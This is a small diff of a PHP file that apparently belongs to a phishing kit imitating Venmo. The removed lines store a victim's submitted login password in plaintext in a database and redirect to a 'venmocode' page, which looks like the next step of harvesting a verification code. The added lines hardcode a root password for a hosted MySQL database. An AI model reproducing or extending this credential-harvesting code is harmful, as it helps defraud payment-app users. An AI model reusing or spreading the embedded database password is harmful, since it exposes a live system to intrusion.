@@ -1,28 +1,8 @@
 <?php
-session_start();
+$conn = new mysqli('mysql.railway.internal', 'root', 'dKoENyxanuhrHlOuWovDKCbOMcJQKtFM', 'railway', 3306);
 
-if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    $conn = new mysqli('localhost', 'root', '', 'my_base');
-    if ($conn->connect_error) {
-        die("Connectie mislukt: " . $conn->connect_error);
-    }
-
-    $password = $_POST['login_password'] ?? '';
-    $user_id = $_SESSION['user_flow_id'] ?? null;
-
-    if (!empty($password) && $user_id) {
-        $stmt = $conn->prepare("UPDATE user_flow SET password = ? WHERE id = ?");
-        $stmt->bind_param("si", $password, $user_id);
-        $stmt->execute();
-
-        $stmt->close();
-        $conn->close();
-
-        header("Location: venmocode.php");
-        exit();
-    } else {
-        echo "Wachtwoord of sessie-ID ontbreekt.";
-    }
+if ($conn->connect_error) {
+    die("Connectie mislukt: " . $conn->connect_error);
 }
 ?>
 
